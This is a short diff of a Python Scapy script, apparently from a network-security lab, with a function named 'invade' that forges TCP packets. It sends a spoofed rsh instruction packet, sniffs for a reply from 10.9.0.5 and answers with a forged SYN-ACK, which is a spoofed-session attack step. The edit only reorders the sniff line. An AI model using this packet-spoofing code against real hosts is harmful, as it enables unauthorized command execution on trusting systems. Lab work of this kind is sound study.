@@ -62,10 +62,10 @@ def invade(interface):
     pacote_rsh = IP/TCP/pacote_instrucao
     scapy.send(pacote_rsh, verbose=0)
 
-    # Sniff do X terminal
-    resposta_sniff = scapy.sniff(count=1, iface=interface, filter="tcp and src host 10.9.0.5")
+
 
     # Envia pacote SYN-ACK
+    resposta_sniff = scapy.sniff(count=1, iface=interface, filter="tcp and src host 10.9.0.5")
     TCP = scapy.TCP(sport=3333, dport=sport, flags='SA', seq=3030, ack=resposta_sniff[0].seq + 1)
     pacote_syn_ack = IP/TCP
     scapy.send(pacote_syn_ack, verbose=0)
